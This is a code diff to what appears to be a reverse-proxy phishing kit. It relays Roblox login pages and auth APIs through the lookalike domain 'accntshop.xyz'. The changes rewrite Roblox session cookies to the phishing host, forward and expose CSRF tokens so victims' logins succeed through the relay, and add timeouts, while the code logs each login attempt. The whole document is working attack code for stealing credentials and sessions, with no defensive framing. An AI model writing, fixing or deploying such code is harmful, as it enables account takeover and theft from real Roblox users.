@@ -38,10 +38,11 @@ function rewriteCookies(proxyRes, req) {
 
     const host = req.headers.host || 'accntshop.xyz';
 
+    // FIX 3: Fixed Secure regex — was missing cases where Secure appears without trailing semicolon
     proxyRes.headers['set-cookie'] = cookies.map(cookie => {
         return cookie
             .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
-            .replace(/Secure;/gi, 'Secure; SameSite=None;');
+            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
     });
 }
 
@@ -126,6 +127,8 @@ app.use('/auth-api', createProxyMiddleware({
     changeOrigin: true,
     secure: true,
     pathRewrite: { '^/auth-api': '' },
+    proxyTimeout: 10000,
+    timeout: 10000,
 
     on: {
         proxyReq: (proxyReq, req) => {
@@ -136,6 +139,11 @@ app.use('/auth-api', createProxyMiddleware({
                 proxyReq.setHeader('user-agent', req.headers['user-agent']);
             }
 
+            // FIX 2: Forward CSRF token from browser → Roblox (required for login retry after 403)
+            if (req.headers['x-csrf-token']) {
+                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
+            }
+
             if (req.path === '/v2/login') {
                 console.log('🔑 LOGIN ATTEMPT');
             }
@@ -143,6 +151,11 @@ app.use('/auth-api', createProxyMiddleware({
 
         proxyRes: (proxyRes, req) => {
             rewriteCookies(proxyRes, req);
+
+            // FIX 1: Expose x-csrf-token header to the browser so it can retry with it
+            if (proxyRes.headers['x-csrf-token']) {
+                proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
+            }
 
             if (req.path === '/v2/login') {
                 console.log(`✅ Login response: ${proxyRes.statusCode}`);
@@ -164,15 +177,27 @@ app.use('/apis-api', createProxyMiddleware({
     changeOrigin: true,
     secure: true,
     pathRewrite: { '^/apis-api': '' },
+    proxyTimeout: 10000,
+    timeout: 10000,
 
     on: {
         proxyReq: (proxyReq, req) => {
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
+
+            // FIX 2: Forward CSRF token
+            if (req.headers['x-csrf-token']) {
+                proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
+            }
         },
 
         proxyRes: (proxyRes, req) => {
             rewriteCookies(proxyRes, req);
+
+            // FIX 1: Expose x-csrf-token header to the browser
+            if (proxyRes.headers['x-csrf-token']) {
+                proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
+            }
         },
 
         error: (err, req, res) => {
@@ -193,6 +218,9 @@ for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
         changeOrigin: true,
         secure: true,
         pathRewrite: { [`^/${prefix}`]: '' },
+        // FIX 4: Add timeouts to prevent socket hang up errors
+        proxyTimeout: 10000,
+        timeout: 10000,
 
         on: {
             error: (err, req, res) => {
@@ -211,6 +239,8 @@ app.use('/', createProxyMiddleware({
     changeOrigin: true,
     secure: true,
     selfHandleResponse: true,
+    proxyTimeout: 10000,
+    timeout: 10000,
 
     pathRewrite: (path) => (path === '/' ? '/login' : path),
 
